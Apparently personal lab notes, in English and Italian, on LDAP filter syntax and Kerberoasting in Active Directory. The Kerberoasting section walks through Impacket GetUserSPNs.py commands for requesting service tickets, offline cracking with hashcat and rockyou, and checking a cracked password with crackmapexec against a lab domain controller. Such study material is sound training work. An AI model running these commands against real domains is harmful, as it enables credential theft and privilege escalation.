This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

## Logical Operators

When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))

This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the Active Directory LDAP module.

# Kerbreroasting from Linux

Il kerberoastin e' una tecnica di lateral movement/privilege escalation in un dominio AD.

L' attacco targetta SPN (Service Principal Names) accounts. SPNs sono identificatori univoci che kerberos usa per mappare un' istanza di un servizio ad un account servizio.

I domain account sono spesso usati per runnare servizi ed evitare limitazioni di autenticazione alla rete . Questi account tipicamente sono del tipo **NT AUTHORITY\LOCAL SERVICE**.

Ogni domain user puo' richiedere a Kerberos un ticket per ogni account di servizio.
Questo e' anche possibile attraverso forest trusts se l'autenticazione permette di attraversare i confini.

Per fare un Kerberoasting ha bisogno di una password di un account in cleartext o NTLM hash, una shell nel contesto del domain user account o un SYSTEM level access in un host del dominio.

Spesso gli account che runnano servizi sono amministratori locali.

Prendere un kerberos ticket per un SPN non permette direttamente di eseguire comandi con quell' account, Il ticket inotlra e' criptato con l' hash NTLM del service account, quindi la password in cleartext si puo' ottenere anche sfruttando sta roba.

Spesso per semplicita' i service account sono configurati con password deboli o riusate, spesso la password e' il nome del servizio.

Se riusciamo ad attaccare un account del server SQL probabilmente ci ritroviamo come locala dmin in molti altri server. 


## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

    From a non-domain joined Linux host using valid domain user credentials.
    From a domain-joined Linux host as root after retrieving the keytab file.
    From a domain-joined Windows host authenticated as a domain user.
    From a domain-joined Windows host with a shell in the context of a domain account.
    As SYSTEM on a domain-joined Windows host.
    From a non-domain joined Windows host using runas /netonly.

Several tools can be utilized to perform the attack:

    Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
    A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
    From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.

## Efficacia
Spesso possiamo provare a craccare molti ticket pero' non e' detto che siano di utenti privilegiati


## Kerberoasting con GetUserSPN.py

RICORDIAMO PRREQUISITO DI BERBEROASTING E' O DOMAIN USER CREDENTIALS(CLEARTEXT PASSWORD O SOLO NTLM HASH SE USIAMO IMPACKET) SHELL NEL CONTESTO DEL DOMAIN USER O ACCOUNT TIPO SISTEM. INOLTRE DBBIAMO SAPERE CHI E' L'HOST DEL DOMAIN CONTROLLER COSI' LO POSSIAMO INTERROGARE.

### Installiamo impacket tool

`python3 -m pip install impacket`

### Listing SPN Accounts 
`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`

### Richiediamo tutti i TGS tickets
`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`

### Richiediamo un solo TGS per un utente specifico (sqldev)
`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`

`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`, salviamo in un output file


### Crackiamo offline con hashcat
`j4k1dibe@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt `


### Proviamo autenticazione col domain controller con la password craccata

`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!` 
